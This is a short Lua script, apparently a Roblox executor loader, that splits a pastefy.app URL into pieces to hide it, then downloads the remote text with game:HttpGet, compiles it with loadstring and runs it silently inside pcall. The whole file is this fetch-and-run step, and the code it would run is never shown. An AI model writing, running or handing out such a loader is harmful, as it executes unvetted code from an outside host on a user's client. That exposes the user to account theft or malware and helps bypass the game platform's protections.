local _ENV = getfenv and getfenv(1) or _ENV
local url = ("https://"..("pastefy"..".app/SCPYxMwn/raw"))
local s = game["HttpGet"](game, url)
local run = (loadstring or function() end)(s)
if type(run) == "function" then
    pcall(run)
end
